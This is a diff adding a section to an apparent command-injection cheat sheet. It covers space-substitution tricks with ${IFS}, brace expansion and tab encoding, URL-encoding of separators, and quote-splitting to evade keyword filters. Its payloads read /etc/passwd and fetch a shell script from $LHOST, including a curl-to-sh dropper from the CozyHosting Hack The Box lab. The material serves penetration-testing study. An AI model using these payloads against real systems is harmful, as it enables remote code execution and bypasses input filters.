@@ -32,3 +32,36 @@ ${IFS}id
 {cat,/etc/passwd}
 c'a't /etc/passwd
 ```
+
+When the target strips literal spaces, substitute each one with an IFS variable, a brace-expanded argument list, a URL-encoded tab, or an ANSI-C quoted space. Note that `${IFS}` works in bash and sh but not in fish.
+
+```bash wrap
+curl${IFS}-s${IFS}http://$LHOST/shell.sh
+curl$IFS-s${IFS}http://$LHOST/shell.sh
+{curl,-s,http://$LHOST/shell.sh}
+%09          # tab character, accepted as whitespace in many CGI contexts
+$'\x20'      # literal space via ANSI-C quoting
+```
+
+When the injection travels through a URL-encoded form body or HTTP parameter, these characters carry additional meaning that must be escaped before your payload is interpreted by the shell.
+
+```bash wrap
+# &  → %26   prevents the parameter from splitting early
+# (space) → %20 or +
+# ;  → %3B   command separator
+# \n → %0a   newline as command separator
+```
+
+Quote-breaking splits a keyword across adjacent empty quote pairs so a naive string-match filter misses it while the shell reassembles the full command.
+
+```bash wrap
+w'h'o'a'm'i
+/bin/b''ash
+c'a't /etc/passwd
+```
+
+A real-world example from CozyHosting (HTB): the app reflected the `username` POST parameter directly into a shell command, and a literal `&` in the body would split the parameter before the shell saw it. Replacing spaces with `${IFS}` and injecting after a `;` separator gives a dropper one-liner that passes through both the URL decoder and the filter.
+
+```bash wrap
+host=localhost&username=;$(curl${IFS}-s${IFS}http://$LHOST/rev|sh)
+```
